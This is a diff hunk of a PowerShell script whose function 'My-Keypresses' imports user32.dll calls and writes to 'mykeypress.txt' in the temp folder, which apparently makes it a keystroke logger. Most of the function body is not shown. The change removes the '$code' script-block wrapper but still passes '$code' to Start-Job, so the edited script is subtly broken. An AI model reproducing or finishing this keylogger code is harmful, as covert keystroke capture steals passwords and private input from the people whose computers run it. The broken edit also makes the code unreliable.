@@ -1,4 +1,4 @@
-$code = {function My-Keypresses($Path="$env:temp\mykeypress.txt") 
+function My-Keypresses($Path="$env:temp\mykeypress.txt") 
  {
    $signatures = @'
  [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
@@ -47,7 +47,7 @@ $code = {function My-Keypresses($Path="$env:temp\mykeypress.txt")
    finally
    {
    }
- }}; $timeoutSeconds = 10; $j = Start-Job -ScriptBlock $code; if (Wait-Job $j -Timeout $timeoutSeconds) { Receive-Job $j }; Remove-Job -force $j
+ }; $timeoutSeconds = 10; $j = Start-Job -ScriptBlock $code; if (Wait-Job $j -Timeout $timeoutSeconds) { Receive-Job $j }; Remove-Job -force $j
 
 
 powershell -noprofile My-Keypresses
